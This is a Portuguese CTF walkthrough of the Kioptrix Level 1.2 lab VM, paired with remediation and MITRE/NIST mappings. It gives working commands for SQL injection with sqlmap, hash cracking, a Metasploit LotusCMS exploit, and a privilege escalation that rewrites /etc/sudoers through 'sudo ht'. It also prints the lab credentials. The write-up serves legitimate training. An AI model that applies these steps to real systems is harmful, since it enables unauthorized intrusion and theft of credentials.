# Kioptrix: Level 1.2 (#3) — Bancos de Dados, CMS e um Editor Hex que Domina o Root

Mano, Kioptrix Level 1.2 (Level 3) é onde a série fica realmente interessante. Injeção SQL em uma página de galeria, requisito de virtual host, credenciais recuperadas de um dump de banco de dados, login SSH com credenciais reais, e então um dos caminhos de escalonamento de privilégios mais criativos na história do VulnHub: usar o editor hex `ht` com sudo para reescrever o `/etc/sudoers` e garantir acesso root completo. Técnica lendária. Também tem o LotusCMS (CVE-2011-0518) como caminho alternativo de acesso inicial, que é igualmente fantástico. Véi, essa é uma máquina intermediária de verdade. top demais.

O hint do `CompanyPolicy.README` do loneferret é um momento lendário de CTF: você encontra o arquivo, lê "use ht como sudo", e a solução fica óbvia. Design brilhante.

---

| Campo | Valor |
|---|---|
| **Nível** | Fácil / Intermediário |
| **VM Alvo** | Kioptrix: Level 1.2 (#3) |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ |
| **Técnicas** | Enumeração de serviços com Nmap, configuração de virtual host, SQLi via sqlmap, login SSH com credenciais recuperadas, escalonamento de privilégios via editor hex ht com sudo (reescrita do sudoers), LotusCMS RCE (CVE-2011-0518, caminho alternativo) |
| **CVEs** | CWE-89 (Injeção SQL em gallery.php: injeção via parâmetro de URL); CVE-2011-0518 (LotusCMS 3.0 injeção PHP eval via Router.php, caminho alternativo); CWE-269 (Gerenciamento inadequado de privilégios: sudo ht NOPASSWD em editor hex equivale a root irrestrito) |
| **Grupos APT** | Extração de credenciais via SQLi é técnica documentada de acesso inicial do APT28 e APT41; exploração de misconfigurações de sudo é usada pelo OceanLotus (APT32) como principal caminho de escalonamento em Linux |

---

## Resumo do Ataque

```
netdiscover → alvo: 192.168.1.101
    |
    v
nmap → HTTP (80), SSH (22)
    |
    v
acessar http://192.168.1.101 → virtual host necessário: kioptrix3.com
    |
    v
echo "192.168.1.101 kioptrix3.com" >> /etc/hosts
    |
    v
acessar kioptrix3.com → LotusCMS, app de galeria
    |
    v
gallery.php?id=1' → erro SQL confirmado
    |
    v
sqlmap -u "kioptrix3.com/gallery/gallery.php?id=1" --dbs --batch
    |
    v
dump dev_accounts → loneferret:starwars, dreg:Mast3r
    |
    v
ssh loneferret@192.168.1.101 → starwars
    |
    v
cat CompanyPolicy.README → "use ht as sudo"
    |
    v
sudo -l → (root) NOPASSWD: /usr/local/bin/ht
    |
    v
sudo ht /etc/sudoers → editar entrada loneferret → ALL=(ALL) NOPASSWD: ALL
    |
    v
sudo su → uid=0(root)
    |
    v
cat /root/congrats.txt
```

---

## Metodologia

1. Descoberta de rede e varredura completa de portas
2. Adicionar entrada de virtual host no `/etc/hosts`
3. Reconhecimento da aplicação web (LotusCMS, galeria)
4. Confirmação de SQLi e exploração com sqlmap
5. Recuperar credenciais SSH do dump de banco de dados
6. Login SSH como `loneferret`
7. Ler CompanyPolicy.README para dica sobre sudo
8. Explorar sudo ht para reescrever `/etc/sudoers`
9. Escalar para root via `sudo su`

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24

nmap -sV -sC -p- 192.168.1.101
```

Descobertas principais:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8 (LotusCMS)
```

Apenas dois serviços. O ataque inteiro passa por HTTP e SSH. Comece com reconhecimento da aplicação web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Configuração de Virtual Host

Acesse `http://192.168.1.101/`. A aplicação retorna erro ou redirecionamento porque requer um nome de virtual host específico.

Inspecione os headers de resposta HTTP ou o conteúdo da página para o hostname esperado. Adicione ao `/etc/hosts`:

```bash
echo "192.168.1.101 kioptrix3.com" >> /etc/hosts
```

Agora acesse `http://kioptrix3.com/`. A instalação do LotusCMS fica acessível.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Descoberta de SQLi

Navegue na seção de galeria: `http://kioptrix3.com/gallery/gallery.php?id=1`

Adicione uma aspas simples para testar SQLi:

```
http://kioptrix3.com/gallery/gallery.php?id=1'
```

Uma mensagem de erro MySQL deve aparecer, confirmando SQL não parametrizado.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta

---

## Passo 4 — Extração do Banco de Dados com sqlmap

Use o sqlmap para enumerar bancos e extrair credenciais:

```bash
# Enumerar bancos de dados
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs --batch

# Enumerar tabelas no banco gallery
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery --tables --batch

# Dump da tabela dev_accounts
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery -T dev_accounts --dump --batch
```

Credenciais recuperadas de `dev_accounts`:

| Usuário | Senha |
|---|---|
| loneferret | starwars |
| dreg | Mast3r |

As senhas podem estar armazenadas como hashes MD5. Se não forem quebradas automaticamente:

```bash
# Identificar tipo de hash
hash-identifier <hash>

# Quebrar com hashcat (MD5)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Nota do mundo real:** sqlmap automatiza o processo tedioso de enumeração de SQLi e é padrão em toolkits de pentest. Caramba, que ferramenta poderosa!

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta; T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Login SSH e Reconhecimento Pós-Acesso

Login via SSH com as credenciais recuperadas:

```bash
ssh loneferret@192.168.1.101
# Senha: starwars
```

Explore o diretório home:

```bash
ls -la
cat CompanyPolicy.README
```

O `CompanyPolicy.README` contém uma dica do criador:

```
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
The software installed is the ht editor, which can be run by typing ht.
At your request, your IT department has made it your default application for when you run sudo.
```

Tradução: `sudo ht` está disponível. Verifique:

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/ht
```

`ht` é um editor hex que pode abrir qualquer arquivo. Com sudo root, pode abrir e editar `/etc/sudoers`. Véi, que caminho elegante!

**MITRE ATT&CK:** T1078.003 — Contas Válidas: Contas Locais; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 6 — Escalonamento de Privilégios via sudo ht

O editor `ht` com sudo root em qualquer arquivo é um escalonamento de privilégios completo. Modifique `/etc/sudoers` para conceder acesso root irrestrito:

```bash
export TERM=xterm-color
sudo ht /etc/sudoers
```

No `ht`:
- Pressione `F3` para abrir arquivo (ou navegue do arquivo atual aberto)
- Encontre a entrada sudoers do `loneferret`:

```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht
```

- Modifique para:

```
loneferret ALL=(ALL) NOPASSWD: ALL
```

- Pressione `F2` para salvar, depois `F10` para sair (ou Alt+F10)

```bash
# Escalar para root:
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat congrats.txt
```

Sensacional! Reescreveu o sudoers com um editor hex e agora é root. Isso é arte! ᕕ( ᐛ )ᕗ

**Nota do mundo real:** Editores de texto interativos em sudoers (vim, nano, ht, less) fornecem acesso root irrestrito ao sistema de arquivos. É um achado consistentemente documentado em pentests Linux.

**MITRE ATT&CK:** T1548.003 — Abusar do Mecanismo de Elevação: Sudo; T1222.002 — Modificação de Permissões de Arquivos e Diretórios: Linux

---

## Caminho Alternativo: LotusCMS RCE (CVE-2011-0518)

LotusCMS 3.0 tem uma vulnerabilidade de injeção PHP eval (CVE-2011-0518). O módulo Metasploit `exploit/multi/http/lcms_php_exec` explora isso diretamente:

```bash
msfconsole
use exploit/multi/http/lcms_php_exec
set RHOST 192.168.1.101
set URI /
exploit
```

Do shell Meterpreter, leia credenciais MySQL do config do CMS:

```bash
cat /var/www/gallery/gconfig.php
# Contém senha root MySQL: fuckeyou
```

Acesse o phpMyAdmin com essas credenciais, navegue até `gallery.dev_accounts` para as mesmas credenciais, depois pivote para SSH.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Exposta (CVE-2011-0518)

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Notas |
|---|---|---|---|
| Credenciais SSH | loneferret:starwars | gallery.dev_accounts via sqlmap | Login SSH |
| Credenciais SSH | dreg:Mast3r | gallery.dev_accounts via sqlmap | Usuário alternativo |
| Credenciais MySQL | root:fuckeyou | /var/www/gallery/gconfig.php | Apenas caminho alternativo |
| Flag root | congrats.txt | /root/congrats.txt | sudo ht reescrita do sudoers |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Principal Lição |
|---|---|---|---|
| 1 | SQLi em parâmetro de URL da galeria | SQLi em parâmetros de URL está no OWASP Top 10; sqlmap torna trivialmente automatizado | Parametrizar todas as queries SQL; validação de input em todos os parâmetros de URL |
| 2 | Credenciais armazenadas no banco via SQLi | Credenciais extraídas do banco fornecem movimento lateral e acesso inicial | Bcrypt com sal para senhas; sem armazenamento reversível de senha |
| 3 | sudo ht (editor hex interativo) | Equivalente a acesso root irrestrito para qualquer usuário com essa entrada sudo | Nunca permitir editores interativos, interpretadores ou pagers em sudoers |
| 4 | CompanyPolicy.README indicando caminho de exploração | Documentação interna real às vezes revela caminhos de acesso privilegiado | Auditar toda documentação para informações de acesso sensíveis antes da distribuição |
| 5 | LotusCMS CVE-2011-0518 | Plataformas CMS EOL com exploits RCE públicos devem ser substituídas imediatamente | Plataformas CMS requerem atualizações regulares; EOL = risco inaceitável |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Exposta (SQLi) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (dump de banco) | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abusar do Mecanismo de Elevação: Sudo | T1548.003 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Modificação de Permissões de Arquivos | T1222.002 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrigir SQLi em gallery.php**: Queries parametrizadas para todas as interações com banco; validação de input em parâmetros de URL
2. **Remover sudo ht NOPASSWD**: Editar sudoers com `visudo`; nunca permitir editores interativos em sudoers
3. **Atualizar LotusCMS**: Substituir CMS EOL por plataforma mantida; aplicar patches do CVE-2011-0518
4. **Restringir credenciais MySQL**: Alterar senha root padrão do MySQL; vincular ao localhost
5. **Armazenar senhas com bcrypt**: Substituir armazenamento MD5 por bcrypt; implementar salting

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as plataformas CMS; auditar queries SQL em todas as aplicações web |
| Proteger | Controle de Acesso | Princípio do privilégio mínimo no sudo; sem editores interativos em sudoers |
| Proteger | Segurança de Dados | Armazenamento de senhas bcrypt; sem hashing de senha reversível |
| Detectar | Anomalias e Eventos | Alertar sobre requisições no padrão sqlmap; WAF para padrões SQLi |
| Responder | Planejamento de Resposta | Redefinir todas as credenciais comprometidas; corrigir SQLi; revisar sudoers |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Entrada | SQL parametrizado; whitelist de parâmetros de URL |
| AC-6 | Privilégio Mínimo | Sudo restrito a comandos específicos e seguros; sem editores |
| IA-5 | Gerenciamento de Autenticadores | Bcrypt com sal; sem MD5 para senhas |
| SI-2 | Remediação de Falhas | Atualizar LotusCMS; aplicar todos os patches de segurança do CMS |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ativos (ASSET) | Gerenciar Inventário de TI | MIL2 |

### MITRE D3FEND

- **D3-SQLP** — Prevenção de Injeção SQL (queries parametrizadas em gallery.php)
- **D3-OAM** — Gerenciamento Administrativo do SO (restrição de sudoers; sem editores)
- **D3-SU** — Atualização de Software (atualização do LotusCMS; migração para bcrypt)

---

## Considerações Finais

Kioptrix Level 1.2 é uma joia. A cadeia SQLi para credenciais SSH é textbook, mas o escalonamento de privilégios via `sudo ht` é o que torna essa máquina memorável. Reescrever o `/etc/sudoers` com um editor hex que você tem via sudo é tão elegante que beira o genial do ponto de vista de design de CTF.

O hint do CompanyPolicy.README é um golpe de mestre: é simultaneamente realista (empresas documentam acesso privilegiado em docs internos) e pedagogicamente valioso (ensina a ler tudo no diretório home). O caminho alternativo com LotusCMS adiciona profundidade extra para quem quer praticar exploração de CVE.

Essa máquina genuinamente testa três domínios de habilidades diferentes: exploração web (SQLi), ataque de credenciais (dump de banco) e escalonamento de privilégios (abuso de sudo). Isso é uma máquina intermediária de verdade. gg no cap.

Thanks guys!! (❍ᴥ❍ʋ)
